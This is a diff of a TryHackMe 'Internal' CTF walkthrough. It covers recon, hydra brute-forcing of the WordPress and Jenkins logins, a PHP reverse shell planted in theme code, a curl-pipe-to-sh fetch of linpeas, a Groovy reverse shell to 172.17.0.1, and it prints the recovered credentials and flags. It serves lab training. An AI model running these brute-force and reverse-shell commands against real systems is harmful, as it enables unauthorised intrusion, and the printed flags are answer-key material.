@@ -1,14 +1,15 @@
-# Internal
+# Internal 
+
+https://tryhackme.com/room/internal
 
 LHOST 10.8.127.74
-RHOST 10.10.76.214, 10.10.30.157
-
+RHOST 10.10.76.214
 
 ## Config
 
 We need to change the content of /etc/hosts
 
-```
+```bash
 10.10.76.214	internal.thm
 ```
 
@@ -16,8 +17,8 @@ We need to change the content of /etc/hosts
 
 ### nmap
 
-```
-root@ST:/home/thm/cc_pentest/ctf# nmap -sC -sV 10.10.76.214
+```bash
+root@thm:~/internal# nmap -sC -sV 10.10.76.214
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-28 13:25 UTC
 Nmap scan report for 10.10.76.214
 Host is up (0.075s latency).
@@ -39,8 +40,8 @@ Nmap done: 1 IP address (1 host up) scanned in 12.64 seconds
 
 ### gobuster
 
-```
-root@ST:/home/thm/cc_pentest/ctf# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.76.214
+```bash
+root@thm:~/internal# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.76.214
 ===============================================================
 Gobuster v3.0.1
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
@@ -71,28 +72,30 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 
 ## Server fingerprint
 
-```
+```html
 <meta name="generator" content="WordPress 5.4.2" />
 ```
 
 ## XSS
 
-Comment are vulnerable to xss
+comments are vulnerable to xss
 
 ## SQLi
 
-```
-root@ST:/home/thm/cc_pentest/ctf# sqlmap -u http://internal.thm/blog/?s=test -p s
+```bash
+root@thm:~/internal# sqlmap -u http://internal.thm/blog/?s=test -p s
 ```
 
-param s doesn't seem to be injectable
+param `s` doesn't seem to be injectable
 
 ## Hydra
 
-`Error: The password you entered for the username admin is incorrect` this message show that the user admin exist, we are going to try to bruteforce it with hydra
+`Error: The password you entered for the username admin is incorrect` 
+
+This message show that the user admin exist, we are going to try to bruteforce it with hydra
 
 ```
-root@ST:/# hydra -l admin -P /usr/share/wordlists/rockyou.txt internal.thm http-post-form "/blog/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:F=incorrect" -V
+root@thm:~/internal# hydra -l admin -P /usr/share/wordlists/rockyou.txt internal.thm http-post-form "/blog/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:F=incorrect" -V
 Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-09-28 14:52:11
@@ -118,7 +121,7 @@ we were able to successefully find the password
 
 `admin:my2boys`
 
-when we login, we have the will credential as a private note
+when we login, we have william credential as a private note
 
 `william:arnold147`
 
@@ -126,8 +129,8 @@ when we login, we have the will credential as a private note
 
 I got a shell by changing theme code in wordpress with `php-reverse-shell.php`
 
-```
-root@ST:/home/thm/cc_pentest/ctf# nc -nlvp 1337
+```bash
+root@thm:~/internal# nc -nlvp 1337
 listening on [any] 1337 ...
 connect to [10.8.127.74] from (UNKNOWN) [10.10.76.214] 35260
 Linux internal 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
@@ -138,20 +141,20 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 $ 
 ```
 
-changing user to william didn't work 
+changing user to william didn't work
 
-```
+```bash
 $ su
 su: must be run from a terminal
 $ python -c 'import pty; pty.spawn("/bin/sh")'
 $ su william
 su william
 No passwd entry for user 'william'
-``` 
+```
 
 ## Linpeas
 
-```
+```bash
 $ curl 10.8.127.74:8000/linpeas.sh | sh
 [+] Sudo version
 [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version
@@ -191,35 +194,31 @@ Nothing important in phpmyadmin
 
 After manual enumeration, aubreanna was stored in /opt/wp-save.txt
 
-```
-aubreanna:bubb13guM!@#123
-```
+`aubreanna:bubb13guM!@#123`
 
 after connecting we find the first flag and jenkins.txt
 
-```
+```bash
 aubreanna@internal:~$ cat user.txt
 THM{int3rna1_fl4g_1}
 ```
 
-```
+```bash
 Internal Jenkins service is running on 172.17.0.2:8080
 ```
 
 SSH port forwarding to access to server jenkins
 
+```bash
+root@thm:~/internal# ssh -L 8080:172.17.0.2:8080 aubreanna@10.10.76.214
 ```
-root@ST:/home/thm# ssh -L 8080:172.17.0.2:8080 aubreanna@10.10.30.157
-```
-
-IP docker0 : 172.17.0.1
 
 ## bruteforce
 
-burteforcing jenkins using hydra 
+burteforcing jenkins using hydra
 
-```
-root@ST:/home/thm/cc_pentest/ctf# hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 8080 localhost http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&Submit=Sign in:F=Invalid" -V
+```bash
+root@thm:~/internal# hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 8080 localhost http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&Submit=Sign in:F=Invalid" -V
 Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-09-28 17:12:39
@@ -237,7 +236,7 @@ we have found the password of jenkins admin:spongebob
 
 running reverse shell
 
-```
+```bash
 String host="172.17.0.1";
 int port=1337;
 String cmd="/bin/bash";
@@ -255,7 +254,7 @@ root:tr0ub13guM!@#123
 
 then we connect with root credential to get the seconde flag root.txt
 
-```
+```bash
 root@internal:~# cat root.txt
 THM{d0ck3r_d3str0y3r}
 
